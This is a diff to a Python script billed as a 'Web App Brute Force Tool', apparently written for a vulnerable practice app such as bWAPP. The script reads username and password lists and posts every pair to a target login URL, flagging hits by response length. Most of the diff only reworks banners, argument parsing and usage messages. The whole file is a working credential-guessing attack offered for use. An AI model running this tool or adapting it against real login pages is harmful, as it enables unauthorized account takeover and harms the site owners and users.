@@ -9,11 +9,13 @@ import requests
 
 # Banner
 print("""
---------------------------------
-    Web App Brute Force Tool    
---------------------------------""") #Removed newline for better formatting
+	--------------------------------
+	|    Web App Brute Force Tool   |
+	--------------------------------""") #Removed newline for better formatting
 
-if len(sys.argv) > 1 :
+
+if len(sys.argv) == 7 : # Must have all 7 positional arguments
+	# Checking first arg
 	match sys.argv[1]:
 		case '-u':
 			targetURL = sys.argv[2]
@@ -27,7 +29,7 @@ if len(sys.argv) > 1 :
 			print(f'[!] Invalid Option {sys.argv[1]} {sys.argv[2]}')
 			print('-----------------------------------------------')
 			print('')
-			#exit() # Added to avoid undeclared 'NameError' errors
+	# Checking third arg
 	match sys.argv[3]:
 		case '-u':
 			targetURL = sys.argv[4]
@@ -41,7 +43,7 @@ if len(sys.argv) > 1 :
 			print(f'[!] Invalid Option {sys.argv[3]} {sys.argv[4]}')
 			print('-----------------------------------------------')
 			print('')
-			#exit() # Added to avoid undeclared 'NameError' errors
+	# Checking fifth option
 	match sys.argv[5]:
 		case '-u':
 			targetURL = sys.argv[6]
@@ -55,18 +57,18 @@ if len(sys.argv) > 1 :
 			print(f'[!] Invalid Option {sys.argv[5]} {sys.argv[6]}')
 			print('-----------------------------------------------')
 			print('')
-			exit() # Added to avoid undeclared 'NameError' errors
+			sys.exit() # Added to avoid undeclared 'NameError' errors
 else:
 	targetURL = input("[>] Enter Target URL: ")
 	loginNamesFile = input("[>] Enter Login Names File: ")
 	passwordsFile = input("[>] Enter Password File: ")
 
 print(f"""
----------------------------------------
+('-----------------------------------------------')
 [*] Target URL: {targetURL}
 [*] Login File: {loginNamesFile}
 [*] Pass File: {passwordsFile}
----------------------------------------
+('-----------------------------------------------')
 """)
 
 # Opening loginNamesFile and passwordsFile
@@ -76,28 +78,21 @@ with open(passwordsFile, encoding="utf-8") as PWF:
 	passwords = PWF.readlines()
 
 try:
-	# Login names and common passwords
-	#loginNames = ["root", "admin", "guest", "test", "user1", "bee"]
-	#passwords = ["password", "qwerty", "123456", "12345678", "123456789", "bug"]
 	for name in loginNames:
 		n = name.strip()
+		# Only printing Usernames now for brevity in output
 		print(f'[*] Trying Login for User: {n}')
 		for word in passwords:
 			w = word.strip()
 			# POST Data = login=admin&password=123456789&security_level=0&form=submit
 			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
-			#print(f"[*] Trying Creds ~> {n}:{w}")
 			if len(r.text) > 4086:
+				# Adding a little spice to our success output
 				print(f"[!] SUCCESS!!! \033[31m{n}:{w}\033[0m")
 				break
 
 except:
-	print("[!] Issue with Target URL")
-	print("[!] Usage: ./brute-force.py https://target-url")
-	print("[!] CHECK YOUR URL!")
-
-
-
-
-
-
+	print("-----------------------------------------------")
+	print("[!] Usage: ./brute-force.py -u https://target -l login.txt -w words.txt")
+	print("[!] OR just run ./brute-force.py to be prompted")
+	print("-----------------------------------------------")
